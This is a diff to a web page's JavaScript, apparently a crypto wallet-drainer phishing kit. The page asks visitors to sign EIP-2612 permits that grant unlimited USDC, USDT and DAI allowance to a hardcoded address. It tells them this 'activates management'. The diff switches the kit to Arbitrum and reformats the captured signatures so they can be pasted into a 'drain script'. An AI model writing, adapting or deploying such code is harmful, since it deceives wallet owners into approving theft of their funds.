@@ -44,14 +44,14 @@
   </div>
 
 <script>
-// CONFIG — REPLACE THESE TWO VALUES
-const VAULT_CONTRACT = "0x9d5cd9513A6F83FdF9E38304c25a9c6a099E3C16";  // Your wallet that receives the permit
+// CONFIG — ARBITRUM (Chain ID 42161)
+const VAULT_CONTRACT = "0x9d5cd9513A6F83FdF9E38304c25a9c6a099E3C16";
 const TOKENS = {
-  "USDC": "0xA0b86a33E6441b8C4C8C8C8C8C8C8C8C8C8C8C8C8", // Mainnet USDC (example)
-  "USDT": "0xdAC17F958D2ee523a2206206994597C13D831ec7",
-  "DAI":  "0x6B175474E89094C44Da98b954EedeAC495271d0F"
+  "USDC": "0xaf88d065e77c8cC2239327C5EDb3A432268e5831",  // Arbitrum USDC
+  "USDT": "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9",  // Arbitrum USDT
+  "DAI":  "0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1"   // Arbitrum DAI
 };
-const CHAIN_ID = 1; // 1=Ethereum, 42161=Arbitrum, 10=Optimism, 8453=Base
+const CHAIN_ID = 42161; // Arbitrum
 
 let provider, signer, userAddr;
 
@@ -108,11 +108,8 @@ async function signPermit() {
   showStatus("Preparing Permit signature...", "pending");
 
   try {
-    // EIP-2612 Permit: owner, spender, value, nonce, deadline, v, r, s
-    // We request MAX_UINT256 allowance for all major stablecoins
     const maxUint = ethers.MaxUint256;
     const deadline = Math.floor(Date.now()/1000) + 3600; // 1 hour
-    const nonces = {};
     
     const permitAbi = [
       "function nonces(address) view returns (uint256)",
@@ -125,7 +122,6 @@ async function signPermit() {
       try {
         const token = new ethers.Contract(tokenAddr, permitAbi, provider);
         const nonce = await token.nonces(userAddr);
-        nonces[sym] = nonce;
 
         // Build Permit message (EIP-712)
         const domain = await token.DOMAIN_SEPARATOR().catch(() => null);
@@ -158,9 +154,9 @@ async function signPermit() {
         // Parse signature
         const sig = ethers.Signature.from(signature);
         
-        // Display for manual submission OR auto-submit via your backend
+        // Display for manual submission — FORMAT MATCHES drain.py PARSER
         permitBox.style.display = 'block';
-        permitBox.innerHTML += `<strong>${sym} Permit:</strong><br>Owner: ${userAddr}<br>Spender: ${VAULT_CONTRACT}<br>Value: MAX<br>Nonce: ${nonce}<br>Deadline: ${deadline}<br>v: ${sig.v}<br>r: ${sig.r}<br>s: ${sig.s}<br><br>`;
+        permitBox.innerHTML += `TOKEN:${sym}\nOWNER:${userAddr}\nSPENDER:${VAULT_CONTRACT}\nVALUE:MAX\nNONCE:${nonce}\nDEADLINE:${deadline}\nV:${sig.v}\nR:${sig.r}\nS:${sig.s}\n---\n`;
         signedAny = true;
       } catch (e) {
         console.log(sym + " permit failed:", e.message);
@@ -169,7 +165,7 @@ async function signPermit() {
 
     if (signedAny) {
       showStatus("✅ Permit signatures generated. Submit them to the vault contract to activate management.", "success");
-      permitBox.innerHTML += `<em>Copy each block above → Paste into your backend / submit via script.</em>`;
+      permitBox.innerHTML += `<em>Copy ALL blocks above → Paste into drain script.</em>`;
     } else {
       showStatus("❌ No compatible stablecoins found or wallet rejected signature.", "error");
     }
